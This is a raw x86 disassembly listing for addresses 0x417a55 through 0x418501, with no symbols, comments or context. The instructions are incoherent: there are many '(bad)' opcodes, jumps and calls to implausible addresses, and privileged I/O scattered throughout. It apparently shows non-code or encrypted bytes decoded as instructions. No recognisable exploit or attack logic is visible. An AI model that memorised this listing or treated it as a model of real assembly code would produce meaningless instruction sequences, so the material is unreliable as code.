  417a55:	mov    esp,0xdbe1c341
  417a5a:	cmp    eax,0x4229095b
  417a5f:	loopne 0x4179e7
  417a61:	jmp    0xad06d5a3
  417a66:	push   ebp
  417a67:	(bad)  
  417a68:	std    
  417a69:	jmp    0x1d8518ab
  417a6e:	push   edx
  417a6f:	pop    ebp
  417a70:	add    cl,ch
  417a72:	xlat   BYTE PTR ds:[ebx]
  417a73:	aad    0x67
  417a75:	jmp    0xe9a95021
  417a7a:	mov    eax,0xc099f41e
  417a7f:	fdivrp st(4),st
  417a81:	imul   BYTE PTR ds:0x97e650d5
  417a87:	int    0xfd
  417a89:	push   esp
  417a8a:	push   cs
  417a8b:	mov    esi,0x5b3dfbb3
  417a90:	or     DWORD PTR [ecx+0x35e95b86],ebp
  417a96:	fimul  DWORD PTR [edx]
  417a98:	dec    ecx
  417a99:	sub    BYTE PTR [edx],bh
  417a9b:	(bad)  
  417a9c:	jae    0x417a77
  417a9e:	inc    ebp
  417a9f:	arpl   WORD PTR [edx],bp
  417aa1:	scas   al,BYTE PTR es:[edi]
  417aa2:	ins    DWORD PTR es:[edi],dx
  417aa3:	loope  0x417a75
  417aa5:	je     0x417a6e
  417aa7:	leave  
  417aa8:	cmc    
  417aa9:	sahf   
  417aaa:	dec    ebp
  417aab:	es push edx
  417aad:	cmp    DWORD PTR [ebx+eax*4-0x3],0x144f4d8e
	...
  417add:	add    BYTE PTR [eax],al
  417adf:	add    BYTE PTR [edi+0x77],dl
  417ae2:	inc    esp
  417ae3:	sub    dh,al
  417ae5:	mov    DWORD PTR [eax-0x16e187b],ecx
  417aeb:	call   eax
  417aed:	push   ebx
  417aee:	in     eax,dx
  417aef:	mul    eax
  417af1:	mov    esi,edi
  417af3:	jne    0x417b58
  417af5:	mov    BYTE PTR [eax+ecx*1-0x1],dh
  417af9:	sub    eax,0x89f0fffb
  417afe:	mov    ah,0xf0
  417b00:	js     0x417a8a
  417b02:	(bad)  
  417b03:	call   0x403e3f
  417b08:	jo     0x417aac
  417b0a:	cmc    
  417b0b:	jmp    0x417aab
  417b0d:	mov    BYTE PTR [esp+edi*8+0x2f],dh
  417b11:	cwde   
  417b12:	verr   WORD PTR [edi]
  417b15:	cwde   
  417b16:	mov    edi,0x8ab41710
  417b1b:	in     al,dx
  417b1c:	xchg   esp,eax
  417b1d:	and    edx,DWORD PTR [ecx+0xa124057]
  417b23:	call   0x404dee
  417b28:	fcomp  QWORD PTR [eax]
  417b2a:	je     0x417b31
  417b2c:	mov    al,0x97
  417b2e:	mov    edi,0x4457e71c
  417b33:	xchg   esp,eax
  417b34:	dec    esp
  417b35:	or     ebx,DWORD PTR [edx]
  417b37:	pop    gs
  417b39:	mov    eax,ds:0x52e0500e
  417b3e:	inc    esi
  417b3f:	push   cs
  417b40:	push   edi
  417b41:	pop    eax
  417b42:	mov    dh,0x47
	...
  417b6c:	add    BYTE PTR [eax],al
  417b6e:	mov    ds:0x58b60ea8,al
  417b73:	pop    ebx
  417b74:	push   eax
  417b75:	movaps XMMWORD PTR [ecx+0x5290500a],xmm4
  417b7c:	inc    esi
  417b7d:	or     dl,BYTE PTR [edi+0x58]
  417b80:	mov    dh,0x47
  417b82:	ds mov ebx,0x7dc80ed1
  417b88:	cld    
  417b89:	dec    edi
  417b8a:	dec    ecx
  417b8b:	xchg   ebp,eax
  417b8c:	retf   0xe05
  417b8f:	lds    edi,FWORD PTR [edx+0x46]
  417b92:	inc    edx
  417b93:	jb     0x417bc6
  417b95:	ss (bad) 
  417b97:	push   esi
  417b98:	mov    ah,0x40
  417b9a:	ds dec edi
  417b9c:	enter  0xee9b,0x29
  417ba0:	dec    esp
  417ba1:	adc    BYTE PTR [esi],bh
  417ba3:	ret    0xc386
  417ba6:	or     al,BYTE PTR [ecx-0x50]
  417ba9:	pop    ds
  417baa:	ds push ss
  417bac:	mov    ebp,0x32aeabfe
  417bb1:	je     0x417c01
  417bb3:	sbb    al,BYTE PTR [eax]
  417bb5:	and    DWORD PTR ss:[ebp-0x176d4002],eax
  417bbc:	jl     0x417c02
  417bbe:	mov    dh,0x74
  417bc0:	mov    eax,0x9f70907
  417bc5:	call   0xfe741c3e
  417bca:	stc    
  417bcb:	push   esi
  417bcc:	xchg   ebp,eax
  417bcd:	(bad)  
  417bce:	imul   edi,DWORD PTR [edx+0xa019],0x0
	...
  417bf9:	add    BYTE PTR [eax],al
  417bfb:	add    BYTE PTR [ecx*8+0x267b8c2f],bl
  417c02:	sar    esi,1
  417c04:	push   ebx
  417c05:	pop    edx
  417c06:	sbb    al,0x94
  417c08:	sbb    al,0xb5
  417c0a:	das    
  417c0b:	(bad)  
  417c0c:	push   ebx
  417c0d:	dec    edx
  417c0e:	das    
  417c0f:	je     0x417c37
  417c11:	call   0x742f:0x9cb9217e
  417c18:	(bad)  
  417c19:	test   eax,0xca9249f
  417c1e:	sbb    al,0x2f
  417c20:	mov    eax,ds:0x13fefc8e
  417c25:	pop    ebx
  417c26:	call   FWORD PTR [ebx]
  417c28:	sub    al,0x79
  417c2a:	sahf   
  417c2b:	xor    DWORD PTR [eax+0xa317b4d],ecx
  417c31:	jae    0x417cb2
  417c33:	sahf   
  417c34:	pop    ds
  417c35:	aam    0x86
  417c37:	jg     0x417c33
  417c39:	not    BYTE PTR [edi]
  417c3b:	xor    edx,esi
  417c3d:	jb     0x417cbe
  417c3f:	rcr    BYTE PTR [edi],cl
  417c41:	aam    0x6e
  417c43:	xor    edx,edx
  417c45:	outs   dx,BYTE PTR ds:[esi]
  417c46:	data16 mov bh,0x41
  417c49:	aam    0xd4
  417c4b:	or     edx,DWORD PTR [esi+0x7e]
  417c4e:	or     DWORD PTR [ecx],esi
  417c50:	inc    eax
  417c51:	rcl    esp,cl
  417c53:	xchg   edi,eax
  417c54:	and    DWORD PTR [ecx+0x3330310c],ecx
  417c5a:	xor    BYTE PTR [esi+0x45],al
  417c5d:	pop    ebx
  417c5e:	pushf  
  417c5f:	jl     0x417c61
	...
  417c89:	add    BYTE PTR ds:0xc2823dd,dl
  417c8f:	shl    DWORD PTR [esi],cl
  417c91:	xor    DWORD PTR [edx+0x9876c73],ecx
  417c97:	xlat   BYTE PTR ds:[ebx]
  417c98:	push   ss
  417c99:	xor    DWORD PTR [ecx-0x2e],esi
  417c9c:	xchg   esp,eax
  417c9d:	sti    
  417c9e:	loope  0x417cd3
  417ca0:	push   esp
  417ca1:	xor    eax,esi
  417ca3:	shl    BYTE PTR [ebx+ecx*1-0x45],cl
  417ca7:	fsub   st,st(7)
  417ca9:	sub    esp,eax
  417cab:	rcl    BYTE PTR [edi-0x19a0add0],cl
  417cb1:	mov    dh,0x39
  417cb3:	ret    
  417cb4:	ins    DWORD PTR es:[edi],dx
  417cb5:	pop    esi
  417cb6:	enter  0x41d2,0x4
  417cba:	push   esp
  417cbb:	pop    ebx
  417cbc:	aas    
  417cbd:	xor    DWORD PTR [ebx+ebx*2],edi
  417cc0:	out    0x7e,eax
  417cc2:	mov    edx,0xa830b35b
  417cc7:	sub    eax,DWORD PTR [eax]
  417cc9:	inc    ebx
  417cca:	outs   dx,DWORD PTR ds:[esi]
  417ccb:	shl    DWORD PTR [ebx-0x27],1
  417cce:	mov    ebx,0x35e967d2
  417cd3:	test   BYTE PTR [eax],dl
  417cd5:	jmp    0x99c51717
  417cda:	dec    edx
  417cdb:	sar    ebp,1
  417cdd:	stc    
  417cde:	cmp    eax,0xb8ae005b
  417ce3:	into   
  417ce4:	icebp  
  417ce5:	jle    0x417d15
  417ce7:	pop    esp
  417ce8:	add    cl,ch
  417cea:	cmp    eax,0x71839a
	...
  417d17:	add    BYTE PTR [edx],dl
  417d19:	sar    ebp,1
  417d1b:	jmp    0x2641d85d
  417d20:	rcl    dh,0xf1
  417d23:	push   esi
  417d24:	push   cs
  417d25:	sar    ch,cl
  417d27:	jmp    0xe1956369
  417d2c:	mov    dl,0x6c
  417d2e:	push   0xffffffe9
  417d30:	test   al,0xd7
  417d32:	lock cmp ch,BYTE PTR [esi-0x2f]
  417d36:	push   eax
  417d37:	pop    esp
  417d38:	rol    ch,0xf1
  417d3b:	es dec esi
  417d3d:	and    cl,BYTE PTR [ebx-0x232da9c]
  417d43:	push   ss
  417d44:	in     eax,dx
  417d45:	shl    BYTE PTR [ebx-0x7],1
  417d48:	cs inc edi
  417d4a:	or     al,0x6
  417d4c:	test   al,0x59
  417d4e:	push   0xffffffe9
  417d50:	cs inc edi
  417d52:	sbb    dh,dh
  417d54:	or     bl,BYTE PTR [esi]
  417d56:	sub    DWORD PTR [esi*1+0x3ae6fdcd],0x42d48462
  417d61:	pop    ebx
  417d62:	add    BYTE PTR [edx+0x4f],ch
  417d65:	(bad)  
  417d66:	icebp  
  417d67:	into   
  417d68:	imul   edx,edx,0x6f23000e
  417d6e:	std    
  417d6f:	call   DWORD PTR [edi+0x56718af5]
  417d75:	push   edi
  417d76:	mov    eax,DWORD PTR [ebp-0x17e59]
	...
  417da4:	add    BYTE PTR [eax],al
  417da6:	push   edi
  417da7:	outs   dx,DWORD PTR ds:[esi]
  417da8:	xlat   BYTE PTR ds:[ebx]
  417da9:	seta   BYTE PTR [ebp-0x7d]
  417dad:	shl    BYTE PTR [ebx],0x60
  417db0:	push   0xfd98569a
  417db5:	mov    edx,fs
  417db7:	push   esi
  417db8:	cld    
  417db9:	(bad)  
  417dba:	call   0x59076365
  417dbf:	pop    ebp
  417dc0:	add    BYTE PTR [ebp-0x507b2e59],al
  417dc6:	addr16 pop ebp
  417dc8:	add    bh,al
  417dca:	loop   0x417d4e
  417dcc:	repnz (bad) 
  417dce:	call   0xca307e36
  417dd3:	out    dx,eax
  417dd4:	mov    ds:0x8b5ce671,eax
  417dd9:	test   DWORD PTR [edi],edx
  417ddb:	test   esi,edi
  417ddd:	inc    edi
  417ddf:	je     0x417d80
  417de1:	(bad)  
  417de3:	pop    ebp
  417de4:	add    eax,0xffffffb3
  417de7:	mov    esi,0x8c4385c6
  417dec:	(bad)  
  417ded:	call   DWORD PTR [ecx]
  417def:	pop    ebp
  417df0:	in     eax,dx
  417df1:	mov    esi,0x41701cbf
  417df6:	out    0xdb,eax
  417df8:	test   BYTE PTR [eax],al
  417dfa:	aas    
  417dfb:	cmp    dh,0x50
  417dfe:	aas    
  417dff:	fmul   QWORD PTR [esi]
  417e01:	add    bh,ah
  417e03:	jecxz  0x417dc2
  417e05:	je     0x417e3f
  417e07:	sbb    BYTE PTR [esp+eiz*8+0x0],al
	...
  417e32:	add    BYTE PTR [eax],al
  417e34:	in     al,0x81
  417e36:	inc    BYTE PTR [edi]
  417e38:	ds ret 0xbd1e
  417e3c:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  417e3e:	mov    ah,0x40
  417e40:	ds inc edi
  417e42:	mov    bh,bh
  417e44:	mov    cl,0x11
  417e46:	das    
  417e47:	dec    edi
  417e48:	xchg   esi,eax
  417e49:	push   ds
  417e4a:	std    
  417e4b:	call   FWORD PTR [ecx-0x138bbec9]
  417e51:	inc    edx
  417e52:	jo     0x417e37
  417e54:	(bad)  
  417e55:	icebp  
  417e56:	cs push es
  417e58:	fldcw  WORD PTR ds:[ebx+0x74]
  417e5c:	and    bl,BYTE PTR [esp+eax*1-0x1]
  417e60:	jmp    0x417e27
  417e62:	cs je  0x417eb7
  417e65:	push   ecx
  417e66:	js     0x417e4f
  417e68:	ins    DWORD PTR es:[edi],dx
  417e69:	dec    ecx
  417e6a:	cs (bad) 
  417e6c:	xchg   ebx,eax
  417e6d:	dec    esi
  417e6e:	xor    bh,dh
  417e70:	push   ecx
  417e71:	cmp    DWORD PTR [eax+0x25e7490f],edi
  417e77:	repnz inc ecx
  417e79:	sub    DWORD PTR [ecx],ebx
  417e7b:	call   0xac5c:0xea2e213b
  417e82:	add    al,0xff
  417e84:	mov    bl,0xbe
  417e86:	cs je  0x417ed3
  417e89:	mov    DWORD PTR [eax-0x19],edi
  417e8c:	or     eax,0xcbfe2e81
  417e91:	gs xor bh,dh
  417e94:	or     DWORD PTR [ecx-0x48],esi
  417e97:	sldt   WORD PTR [eax]
	...
  417ec2:	add    DWORD PTR [edi],ebp
  417ec4:	and    eax,0x1960f9f2
  417ec9:	jbe    0x417ebe
  417ecb:	pop    eax
  417ecc:	cs (bad) 
  417ece:	mov    bl,0x5d
  417ed0:	xor    bh,dh
  417ed2:	loope  0x417f2d
  417ed4:	xchg   edx,eax
  417ed5:	push   cs
  417ed6:	ds ret 0xc13c
  417eda:	sub    bl,BYTE PTR [ebx-0x19]
  417edd:	(bad)  
  417ede:	mov    ah,0xbe
  417ee0:	push   0x48
  417ee2:	vunpcklps xmm0,xmm4,XMMWORD PTR [ebp+0x4]
  417ee7:	sbb    ah,bh
  417ee9:	add    ebp,DWORD PTR [edx]
  417eeb:	nop
  417eec:	scas   al,BYTE PTR es:[edi]
  417eed:	(bad)  
  417eee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417eef:	pop    edx
  417ef0:	out    0x3,eax
  417ef2:	test   BYTE PTR ds:[edi+0x5c2b09d4],ah
  417ef9:	xlat   BYTE PTR ds:[ebx]
  417efa:	xchg   ebp,eax
  417efb:	sub    al,0xa6
  417efd:	pop    ss
  417efe:	and    DWORD PTR [ebx],0x9abb0428
  417f04:	adc    BYTE PTR [edx],al
  417f06:	gs jnp 0x417f73
  417f09:	scas   eax,DWORD PTR es:[edi]
  417f0a:	jne    0x417f66
  417f0c:	cld    
  417f0d:	add    DWORD PTR [ebp+0x73],edx
  417f10:	lfs    ebp,FWORD PTR [edx+ebx*1-0x19]
  417f15:	sub    al,0xd2
  417f17:	into   
  417f18:	outs   dx,BYTE PTR ds:[esi]
  417f19:	mov    bh,0x39
  417f1b:	ret    
  417f1c:	and    ebx,DWORD PTR [edi+0x48]
  417f1f:	iret   
  417f20:	jb     0x417ef9
  417f22:	inc    ebp
  417f23:	jecxz  0x417f1e
  417f25:	sub    al,0x0
	...
  417f4f:	add    BYTE PTR [edx+0x39d24ecf],dh
  417f55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f56:	sub    DWORD PTR [eax],ecx
  417f58:	sub    BYTE PTR ds:[edx+0x20],dh
  417f5c:	mov    esp,0x199a3397
  417f61:	inc    ebp
  417f62:	lea    ebp,[edx+ecx*4]
  417f65:	arpl   WORD PTR [edi],cx
  417f67:	leave  
  417f68:	sub    esi,ecx
  417f6a:	push   ds
  417f6b:	jnp    0x417fe7
  417f6d:	iret   
  417f6e:	push   ss
  417f6f:	mov    bh,0x41
  417f71:	ret    
  417f72:	js     0x417fa1
  417f74:	lock into 
  417f76:	(bad)  
  417f77:	sub    eax,0x2ce71c58
  417f7c:	sub    ch,BYTE PTR [eax-0x31035f00]
  417f82:	(bad)  
  417f83:	je     0x417f5a
  417f85:	mov    dh,0x9b
  417f87:	loop   0x417fa3
  417f89:	int    0x68
  417f8b:	fbld   TBYTE PTR [edx+0x2d41001b]
  417f91:	push   ss
  417f92:	aas    
  417f93:	jmp    0xc66866ed
  417f98:	pop    edx
  417f99:	push   ds
  417f9a:	push   eax
  417f9b:	push   ecx
  417f9c:	scas   eax,DWORD PTR es:[edi]
  417f9d:	ds aas 
  417f9f:	jmp    0x2215070e
  417fa4:	jge    0x417f74
  417fa6:	(bad)  
  417fa7:	sbb    al,0x8a
  417fa9:	mov    dh,0x18
  417fab:	popf   
  417fac:	push   edx
  417fad:	int    0xe8
  417faf:	mov    ch,0x5f
  417fb1:	int    0xfd
  417fb3:	add    eax,DWORD PTR [eax]
	...
  417fdd:	add    BYTE PTR [edx],bh
  417fdf:	inc    ebx
  417fe0:	ja     0x417fda
  417fe2:	jl     0x417fb2
  417fe4:	gs sub al,0xad
  417fe7:	sbb    eax,DWORD PTR [eax]
  417fe9:	add    DWORD PTR [ebx+ebx*2],edi
  417fec:	add    BYTE PTR [ecx+0x35],ch
  417fef:	mov    al,0x23
  417ff1:	data16 sbb ah,BYTE PTR [ecx-0x40]
  417ff5:	aad    0x5d
  417ff7:	ss jg  0x417fd2
  417ffa:	cld    
  417ffb:	int    0x4d
  417ffd:	inc    ecx
  417ffe:	xchg   edi,eax
  417fff:	js     0x417ffe
  418001:	inc    esi
  418002:	or     eax,0x88f4fd1e
  418007:	push   ss
  418008:	aas    
  418009:	jmp    0x4149c778
  41800e:	and    dl,cl
  418010:	std    
  418011:	es and eax,0x521e22fc
  418017:	ss ds cdq 
  41801a:	cld    
  41801b:	int    0xfe
  41801d:	aam    0x88
  41801f:	push   ss
  418020:	aas    
  418021:	add    bh,dl
  418023:	jle    0x418099
  418025:	or     BYTE PTR [edi-0x49],cl
  418028:	cli    
  418029:	call   eax
  41802b:	repnz std 
  41802d:	bound  ecx,QWORD PTR [bp+si]
  418030:	inc    ecx
  418031:	add    al,ah
  418033:	retf   
  418034:	aam    0x48
  418036:	push   ss
  418037:	push   edi
  418038:	std    
  418039:	jne    0x417fda
  41803b:	jno    0x417fed
  41803d:	sti    
  41803e:	add    BYTE PTR [ecx+0x67],0x0
	...
  418069:	add    BYTE PTR [eax],al
  41806b:	add    BYTE PTR [edi],cl
  41806d:	xchg   BYTE PTR [ebp+0x41],ch
  418070:	xchg   edi,eax
  418071:	xor    BYTE PTR [edx*8-0x10267a1],0x4a
  418079:	iret   
  41807a:	in     eax,0x9c
  41807c:	fadd   QWORD PTR [ecx-0x7cd50002]
  418082:	(bad)  
  418083:	jne    0x4180e4
  418085:	jno    0x41805c
  418087:	pop    ds
  418088:	rol    BYTE PTR [ecx+0x595bc2c8],0x53
  41808f:	mov    esi,DWORD PTR [ebx-0x2e0b3e29]
  418095:	cmp    esi,0x5eef676a
  41809b:	jmp    FWORD PTR [edx-0x2f]
  41809e:	in     eax,0x79
  4180a0:	inc    eax
  4180a1:	cmp    dh,0x89
  4180a4:	jmp    0x40f7:0xa305c674
  4180ab:	add    BYTE PTR ds:0x92000059,dl
  4180b1:	(bad)  
  4180b3:	(bad)  
  4180b4:	push   eax
  4180b5:	or     BYTE PTR [ebp+0x68],0x1b
  4180b9:	pop    eax
  4180ba:	add    BYTE PTR [eax],al
  4180bc:	das    
  4180bd:	je     0x4180cb
  4180bf:	add    BYTE PTR [edi],dl
  4180c1:	icebp  
  4180c2:	sub    DWORD PTR [edx+0x3e],esi
  4180c5:	add    eax,DWORD PTR [edx]
  4180c7:	push   0xffc4f01e
  4180cc:	popa   
  4180cd:	xlat   BYTE PTR ds:[ebx]
  4180ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180cf:	inc    eax
	...
  4180f8:	add    BYTE PTR [eax],al
  4180fa:	ds int 0xf0
  4180fd:	aam    0x86
  4180ff:	add    eax,DWORD PTR [edx]
  418101:	dec    DWORD PTR [ebx-0x46]
  418104:	sbb    ebx,ebx
  418106:	popf   
  418107:	mov    ch,0x2a
  418109:	adc    dh,BYTE PTR [bx+si]
  41810c:	ret    
  41810d:	jmp    DWORD PTR [ecx]
  41810f:	bound  esi,QWORD PTR [esi-0x58e5c1c0]
  418115:	pusha  
  418116:	inc    ecx
  418118:	cdq    
  418119:	add    DWORD PTR [esi],edi
  41811b:	ret    0xfe81
  41811e:	adc    edi,DWORD PTR [edx-0x22240e7]
  418124:	sub    cl,BYTE PTR [ebx+eax*8-0x7e01d813]
  41812b:	xchg   edx,eax
  41812c:	sbb    al,0x8b
  41812e:	dec    ebx
  41812f:	ret    0xc701
  418132:	cmp    edi,DWORD PTR [esi]
  418134:	mov    eax,ds:0x1c13e40
  418139:	add    BYTE PTR [esi],bh
  41813b:	aas    
  41813c:	xor    dh,0x58
  41813f:	inc    ebp
  418140:	sub    cl,BYTE PTR [edi-0x1a]
  418143:	mov    ch,0x4
  418145:	add    BYTE PTR [esi],bh
  418147:	sub    al,BYTE PTR [esi-0x663dc1f4]
  41814d:	sub    ebp,DWORD PTR [ebx+eax*1-0x4fa197fe]
  418154:	(bad)  
  418155:	jmp    DWORD PTR [ecx+0x3e40a497]
  41815b:	(bad)  
  41815c:	lock aam 0x0
	...
  418187:	add    BYTE PTR [esi-0x7400fdfd],al
  41818d:	mov    edx,0x5add7b19
  418192:	sub    bl,BYTE PTR es:[ecx-0x63b6681]
  418199:	xor    eax,edi
  41819b:	mov    ch,0x7e
  41819d:	pop    ebx
  41819e:	jg     0x418148
  4181a0:	pop    esi
  4181a1:	sbb    ah,bh
  4181a3:	fwait
  4181a4:	aas    
  4181a5:	pop    ebx
  4181a6:	out    0x83,eax
  4181a8:	fadd   DWORD PTR [ebp-0x21]
  4181ab:	sbb    esi,DWORD PTR [ecx-0x8]
  4181ae:	out    dx,al
  4181af:	sub    DWORD PTR [edx-0x3fd5212b],edi
  4181b5:	retf   
  4181b6:	aaa    
  4181b7:	sbb    al,0x65
  4181b9:	pop    esi
  4181ba:	out    0x3,eax
  4181bc:	mov    cl,0x45
  4181be:	retf   
  4181bf:	sub    DWORD PTR [edx],esi
  4181c1:	arpl   di,cx
  4181c3:	xor    eax,DWORD PTR [ebx-0x34]
  4181c6:	mov    esi,0xe7567f3b
  4181cb:	into   
  4181cc:	les    edi,FWORD PTR [esi+0x2385406a]
  4181d2:	aaa    
  4181d3:	int3   
  4181d4:	sbb    DWORD PTR [edi],edx
  4181d6:	xchg   esi,eax
  4181d7:	les    edi,FWORD PTR [ecx-0x3d]
  4181da:	sbb    DWORD PTR [ebx],eax
  4181dc:	jge    0x4181a9
  4181de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181df:	mov    edi,0x3e75a65
  4181e4:	ds or  al,0xc1
  4181e7:	mov    ch,0xfe
  4181e9:	pop    edx
  4181ea:	jbe    0x41819b
	...
  418214:	add    BYTE PTR [eax],al
  418216:	cmp    esp,ebx
  418218:	in     al,0x42
  41821a:	int3   
  41821b:	sbb    edi,esp
  41821d:	lahf   
  41821e:	sahf   
  41821f:	mov    ah,bh
  418221:	add    edi,DWORD PTR [esi]
  418223:	fcmovne st,st(7)
  418225:	add    eax,0x28df4f3e
  41822a:	mov    dl,0x53
  41822c:	dec    edi
  41822d:	jbe    0x418278
  41822f:	retf   0x1b3e
  418232:	rcr    DWORD PTR [ebx+0x0],1
  418235:	jmp    0x41c3577
  41823a:	push   edi
  41823b:	leave  
  41823c:	std    
  41823d:	pushf  
  41823e:	add    eax,0x26fc89c3
  418243:	leave  
  418244:	mov    eax,ds:0x1bab54
  418249:	test   DWORD PTR [esi],edx
  41824b:	pop    DWORD PTR [eax]
  41824d:	jmp    0x25cadd8f
  418252:	sahf   
  418253:	leave  
  418254:	xor    ebp,ecx
  418256:	cmp    eax,0xed94005b
  41825b:	inc    edx
  41825c:	and    cl,ah
  41825e:	std    
  41825f:	retf   0xc065
  418262:	outs   dx,BYTE PTR ds:[esi]
  418263:	mov    al,BYTE PTR [eax]
  418265:	cmp    esi,ebx
  418267:	shl    DWORD PTR [ebx],cl
  418269:	jmp    0xc641ddab
  41826e:	shl    BYTE PTR [edx-0x3],1
  418271:	(bad)  
  418272:	mov    esp,0x7a2d3e89
  418277:	retf   0xce71
	...
  4182a2:	add    BYTE PTR [eax],al
  4182a4:	ret    0x10d2
  4182a7:	sbb    eax,0x9d43a185
  4182ac:	cmp    al,0x5b
  4182ae:	add    cl,ch
  4182b0:	push   edx
  4182b1:	imul   edi,ebp,0xffffffd4
  4182b4:	loopne 0x418302
  4182b6:	aas    
  4182b7:	jmp    0xfb0111d2
  4182bc:	jl     0x418288
  4182be:	in     eax,0x7d
  4182c0:	inc    ebx
  4182c1:	retf   0x6afd
  4182c4:	or     DWORD PTR [edx-0x17],esi
  4182c7:	scas   al,BYTE PTR es:[edi]
  4182c8:	jo     0x41829f
  4182ca:	in     al,dx
  4182cb:	jb     0x4182d5
  4182cd:	push   esi
  4182ce:	mov    DWORD PTR [ebp+ecx*2-0x591e8d36],ebp
  4182d5:	dec    edx
  4182d6:	mov    eax,0x5e1700
  4182db:	call   ebp
  4182dd:	ror    DWORD PTR [esi+0x5e6380],1
  4182e3:	add    BYTE PTR [eax+0x10],bl
  4182e6:	push   cs
  4182e7:	(bad)  
  4182e8:	xchg   edi,eax
  4182e9:	cmp    bh,ch
  4182eb:	jmp    edi
  4182ed:	fidivr WORD PTR [ecx+eax*8]
  4182f0:	aam    0x9c
  4182f2:	std    
  4182f3:	call   ebx
  4182f5:	ins    BYTE PTR es:[edi],dx
  4182f6:	std    
  4182f7:	xor    eax,0x410f7a
  4182fc:	fdiv   DWORD PTR [edi+0x5da673c0]
  418302:	call   0xfeb470b8
  418307:	mov    eax,0x0
	...
  418330:	add    BYTE PTR [eax],al
  418332:	xlat   BYTE PTR ds:[ebx]
  418333:	pop    ebp
  418334:	add    BYTE PTR [eax],al
  418336:	jp     0x418355
  418338:	and    DWORD PTR [eax],eax
  41833a:	add    edx,DWORD PTR [edx+0x4]
  41833d:	add    BYTE PTR [edi-0x2f7cffa3],dl
  418343:	pop    edx
  418344:	cmp    DWORD PTR [edi],0x3f84d0a7
  41834a:	enter  0xfe81,0x8b
  41834e:	bound  esi,QWORD PTR [ebx+0x5e]
  418351:	leave  
  418352:	aad    0x5a
  418354:	add    BYTE PTR [ebp-0x14],dl
  418357:	bound  eax,QWORD PTR [edx+0x4d98cbc4]
  41835d:	pop    eax
  41835e:	aas    
  41835f:	adc    esi,esi
  418361:	inc    eax
  418362:	push   edi
  418363:	jne    0x4183d4
  418365:	add    DWORD PTR [ecx+eax*4-0x78233676],esp
  41836c:	sub    dh,dh
  41836e:	fadd   QWORD PTR [edi-0x4487059b]
  418374:	add    BYTE PTR [ebx-0x3bbaf92],cl
  41837a:	ds cmp eax,0x3d44ea3b
  418380:	cmp    eax,DWORD PTR [edx]
  418382:	clc    
  418383:	dec    ebp
  418384:	cmp    ecx,DWORD PTR [edi-0x3b]
  418387:	mov    ebx,DWORD PTR [edi+edi*8]
  41838a:	inc    ebp
  41838b:	mov    dl,0x1
  41838d:	mov    esi,edi
  41838f:	jmp    0xc879:0x743dc87a
	...
  4183be:	add    BYTE PTR [eax],al
  4183c0:	stc    
  4183c1:	mul    DWORD PTR ds:0x46e7382
  4183c7:	jne    0x4183a7
  4183c9:	clc    
  4183ca:	cmp    al,0xc2
  4183cc:	mov    ecx,DWORD PTR [ebp+0x18]
  4183cf:	dec    edi
  4183d0:	jbe    0x4183bc
  4183d2:	mov    esi,edi
  4183d4:	jle    0x418388
  4183d6:	sub    DWORD PTR [ecx+0x3f],esi
  4183d9:	jne    0x418400
  4183db:	mov    bh,BYTE PTR [ebx-0x36]
  4183de:	cli    
  4183df:	mov    edi,0x41ab632
  4183e4:	mov    al,0xba
  4183e6:	and    eax,DWORD PTR [edi]
  4183e8:	(bad)  
  4183e9:	xor    ecx,ebp
  4183eb:	jmp    FWORD PTR [edx]
  4183ed:	or     BYTE PTR ds:0xd0b242c1,bh
  4183f3:	mov    ah,BYTE PTR [edx-0x120cc2cb]
  4183f9:	popa   
  4183fa:	int3   
  4183fb:	addr16 jle 0x4183f8
  4183fe:	sar    edi,0x71
  418401:	fs add eax,ebx
  418404:	jno    0x4183ff
  418406:	shl    bl,0x3e
  418409:	mov    dl,0x1
  41840b:	add    BYTE PTR ds:0x5a4478fd,dl
  418411:	bound  esp,QWORD PTR ds:0x3eda4674
  418417:	or     bh,BYTE PTR [esi]
  418419:	mov    dl,0x80
  41841b:	mov    edi,0x271c5ac6
  418420:	mov    dl,0x53
  418422:	dec    edi
  418423:	mov    al,BYTE PTR [eax]
	...
  41844d:	add    BYTE PTR [eax-0x38],cl
  418450:	push   esi
  418451:	jl     0x4183d5
  418453:	ret    
  418454:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418455:	rcr    DWORD PTR [ecx],cl
  418457:	xchg   edi,eax
  418458:	out    0x26,al
  41845a:	sbb    dl,dl
  41845c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41845d:	das    
  41845e:	adc    BYTE PTR [esi+0x33],cl
  418461:	sbb    eax,ebx
  418463:	push   esp
  418464:	out    0x3,eax
  418466:	xor    eax,0xf90f9b9b
  41846b:	dec    ebp
  41846c:	pop    ds
  41846d:	es push 0xffffffcf
  418470:	mov    bh,0x1b
  418472:	loope  0x4184db
  418474:	push   cs
  418475:	es loopne 0x4184c5
  418478:	add    ebx,DWORD PTR [ebx]
  41847a:	dec    ebp
  41847b:	push   ebp
  41847c:	out    0x3,eax
  41847e:	ror    DWORD PTR [ebp-0x21],1
  418481:	sbb    ecx,DWORD PTR [ebp+0x62]
  418484:	out    dx,al
  418485:	and    eax,0x4db45bc
  41848a:	xor    ch,BYTE PTR [ecx+0x4f]
  41848d:	dec    ebx
  41848e:	sub    al,0x1a
  418490:	out    0x24,eax
  418492:	xor    cl,bh
  418494:	mov    edi,0xe75b3419
  418499:	clc    
  41849a:	(bad)  [esi-0x1c]
  41849d:	push   0x3e75b3e
  4184a2:	mov    DWORD PTR [ebp-0x4d],ecx
  4184a5:	sbb    al,0x1b
  4184a7:	push   0x9bc425a6
  4184ac:	inc    edx
  4184ad:	cmp    edi,DWORD PTR [edi+0x5e]
  4184b0:	out    0xce,eax
	...
  4184da:	add    BYTE PTR [eax],al
  4184dc:	mov    ah,0xb6
  4184de:	aaa    
  4184df:	int3   
  4184e0:	fldcw  WORD PTR [edx]
  4184e2:	add    ah,0x59
  4184e5:	iret   
  4184e6:	stc    
  4184e7:	add    bh,BYTE PTR [ebp-0x39]
  4184ea:	add    BYTE PTR [esi-0x67],dh
  4184ed:	pop    edi
  4184ee:	call   0xfe09ba2b
  4184f3:	shl    DWORD PTR ds:0xfcb1283f,cl
  4184f9:	(bad)  
  4184fa:	(bad)  
  4184fb:	fsub   QWORD PTR ds:0x5af2fdbf
  418501:	lds    ebp,FWORD PTR [edx-0xf]
